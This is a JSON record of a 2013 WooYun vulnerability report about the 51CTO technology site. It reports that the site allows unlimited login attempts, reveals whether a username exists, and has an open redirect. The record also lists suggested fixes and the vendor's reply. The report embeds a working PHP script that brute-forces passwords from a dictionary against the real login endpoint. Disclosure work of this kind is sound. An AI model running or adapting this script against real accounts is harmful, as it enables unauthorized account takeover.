{"id": 61098, "wybug_id": "wooyun-2013-040782", "wybug_title": "51CTO技术网站可爆破用户帐号附爆破代码一份", "wybug_corp": "51CTO技术网站", "wybug_author": "秋风", "wybug_date": "2013-10-23 18:22", "wybug_open_date": "2013-10-28 18:23", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 1#如果你认为我会去利用这个页面（http://home.51cto.com/index.php），那肯定是行不通滴，这里有条件限制，我们只能另辟蹊径！2#这个利用点还会提示用户名是否存在- -！！！ 详细说明：  #1可利用的爆破地址如下#2reback参数同时存在url跳转漏洞http://ucenter.51cto.com/login.php?reback=http://wooyun.org目测受影响站点如下:http://www.cioage.comhttp://bbs.51cto.comhttp://blog.51cto.comhttp://selftest.51cto.comhttp://doctor.51cto.comhttp://home.51cto.comhttp://t.51cto.comhttp://down.51cto.comhttp://job.51cto.com附：利用时的源码一份\n<?php// 读取字典$passwd = file(\"./passwd.txt\");$max = count($passwd);for($i=0;$i<$max;$i++){\t$post = array(\t\t\"action\"=>'login',\t\t\"username\"=>\"username\",\t\t\"password\"=>trim($passwd[$i]),\t);\t$ch = curl_init();\tcurl_setopt($ch, CURLOPT_URL, \"http://ucenter.51cto.com/login.php?reback=http://wooyun.org\");\tcurl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);\tcurl_setopt($ch, CURLOPT_POST, 1);\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $post);\t$data = curl_exec($ch);\tcurl_close($ch);\tif ($data[1] ==\"s\")\t{\t\texit(\"password:\".$passwd[$i]);\t}}?>\n   漏洞证明：  \n\n   修复方案：  1.有效的次数限制2.也可以考虑考虑验证码3.强烈建议不要提示类似与“用户名不存在”等让利用很容易校验用户名的真伪   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-28 18:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-30 17:08 |    \t\t51CTO技术网站(乌云厂商)\t\t \n  感谢白帽同学提交漏洞，确认有点晚了。该漏洞己修复。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}